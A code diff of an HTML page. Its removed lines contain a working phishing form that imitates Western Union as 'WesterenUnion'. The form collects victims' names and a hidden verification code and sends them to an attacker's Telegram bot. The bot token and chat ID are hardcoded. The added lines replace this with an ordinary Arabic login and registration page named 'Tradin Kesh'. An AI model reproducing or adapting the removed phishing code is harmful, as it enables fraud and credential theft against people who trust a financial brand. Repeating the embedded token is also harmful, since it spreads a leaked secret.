@@ -1,121 +1,31 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WesterenUnion</title>
-    <style>
-        body {
-            background-color: yellow;
-            font-family: Arial, sans-serif;
-            text-align: center;
-        }
-        .container {
-            max-width: 300px;
-            margin: 50px auto;
-            background: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        }
-        h1 {
-            text-align: left;
-            font-size: 18px;
-            margin-left: 10px;
-        }
-        .input-group {
-            position: relative;
-            width: 100%;
-            margin-top: 10px;
-        }
-        input {
-            width: 100%;
-            padding: 10px;
-            font-size: 16px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-        }
-        .eye-icon {
-            position: absolute;
-            right: 10px;
-            top: 50%;
-            transform: translateY(-50%);
-            cursor: pointer;
-            font-size: 18px;
-        }
-        button {
-            width: 100%;
-            margin-top: 10px;
-            padding: 10px;
-            font-size: 16px;
-            background: blue;
-            color: white;
-            border: none;
-            cursor: pointer;
-            border-radius: 5px;
-        }
-        button:hover {
-            background: darkblue;
-        }
-    </style>
+    <title>Tradin Kesh</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
-
-    <h1>WesterenUnion</h1>
-
-    <div class="container">
-        <input type="text" id="firstName" placeholder="First name">
-        <input type="text" id="lastName" placeholder="Last name">
-        
-        <div class="input-group">
-            <input type="password" id="code" placeholder="Code">
-            <span class="eye-icon" onclick="togglePassword()">👁️</span>
-        </div>
-        
-        <button onclick="sendToTelegram()">Verification</button>
+    <!-- نموذج تسجيل الدخول -->
+    <div class="container" id="login-container">
+        <h2>تسجيل الدخول</h2>
+        <input type="text" id="username" placeholder="اسم المستخدم">
+        <input type="password" id="password" placeholder="كلمة المرور">
+        <button class="login" onclick="login()">تسجيل الدخول</button>
+        <button class="register" onclick="showRegisterForm()">تسجيل</button>
     </div>
 
-    <script>
-        function togglePassword() {
-            let codeInput = document.getElementById("code");
-            if (codeInput.type === "password") {
-                codeInput.type = "text";
-            } else {
-                codeInput.type = "password";
-            }
-        }
+    <!-- نموذج التسجيل -->
+    <div class="container" id="register-container" style="display: none;">
+        <h2>تسجيل حساب جديد</h2>
+        <input type="email" id="email" placeholder="البريد الإلكتروني">
+        <input type="text" id="new-username" placeholder="اسم المستخدم">
+        <input type="password" id="new-password" placeholder="كلمة المرور">
+        <input type="password" id="confirm-password" placeholder="تأكيد كلمة المرور">
+        <button class="register" onclick="register()">إنشاء الحساب</button>
+    </div>
 
-        function sendToTelegram() {
-            let firstName = document.getElementById("firstName").value;
-            let lastName = document.getElementById("lastName").value;
-            let code = document.getElementById("code").value;
-
-            if (!firstName || !lastName || !code) {
-                alert("يرجى ملء جميع الحقول!");
-                return;
-            }
-
-            let botToken = "7719751525:AAG3Nlfn9obc5pjJGAuVUUbn8ZKjczhz0tw"; // استبدل هذا بالتوكن الفعلي الخاص بك
-            let chatId = "7696290146"; // استبدل هذا بمعرف الدردشة (Chat ID) الخاص بك
-            
-            let message = `🔹 First Name: ${firstName}\n🔹 Last Name: ${lastName}\n🔹 Code: ${code}`;
-
-            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
-            fetch(url)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        alert("تم الإرسال بنجاح!");
-                    } else {
-                        alert("حدث خطأ أثناء الإرسال!");
-                    }
-                })
-                .catch(error => {
-                    alert("فشل الاتصال بالتيليغرام!");
-                });
-        }
-    </script>
-
+    <script src="script.js"></script>
 </body>
 </html>
